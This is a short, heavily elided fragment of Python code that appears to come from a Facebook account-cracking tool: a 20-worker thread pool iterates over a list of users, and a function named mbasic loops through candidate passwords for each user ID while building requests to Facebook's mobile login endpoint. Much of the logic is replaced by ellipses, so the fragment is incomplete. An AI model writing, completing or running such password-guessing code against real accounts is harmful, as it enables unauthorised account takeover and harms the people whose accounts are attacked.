...
def SUMON2():
    ...
    with ThreadPool(max_workers=20) as SUMON_xd:
        clear()
        SUMON_time()
        tl = str(len(user))
...
def mbasic(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'referer': 'https://touch.facebook.com/login/device-based/password/?uid=' + uid + '&flow=login_no_pin&refsrc=deprecated&_rdr',
